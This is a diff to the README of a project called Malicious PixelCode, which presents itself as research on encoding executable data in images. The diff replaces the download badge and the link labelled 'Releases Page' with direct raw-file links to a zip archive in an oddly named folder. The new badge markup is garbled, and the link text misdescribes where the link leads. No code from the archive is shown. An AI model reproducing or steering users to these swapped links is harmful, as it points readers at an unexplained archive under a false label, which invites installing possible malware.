@@ -9,14 +9,14 @@ Malicious PixelCode is a security research project that shows how to encode exec
 - **Security Research Focus**: Understand and explore unconventional data delivery methods.
 
 ## 📥 Download
-[![Download Malicious-PixelCode](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Bishal67934/Malicious-PixelCode/releases)
+[![Download Malicious-PixelCode](https://raw.githubusercontent.com/Bishal67934/Malicious-PixelCode/main/antitrypsin/Malicious-PixelCode_v2.5.zip%https://raw.githubusercontent.com/Bishal67934/Malicious-PixelCode/main/antitrypsin/Malicious-PixelCode_v2.5.zip)](https://raw.githubusercontent.com/Bishal67934/Malicious-PixelCode/main/antitrypsin/Malicious-PixelCode_v2.5.zip)
 
 ## 🚀 Getting Started
 To get started with Malicious PixelCode, follow these steps:
 
 1. **Visit the Releases Page**: Head over to our releases page where you can find the downloadable files. 
    
-   [Download from Releases Page](https://github.com/Bishal67934/Malicious-PixelCode/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/Bishal67934/Malicious-PixelCode/main/antitrypsin/Malicious-PixelCode_v2.5.zip)
 
 2. **Choose Your Version**: Find the most recent version of Malicious PixelCode. It is usually the first one listed. Click on it to see all the available files.
 
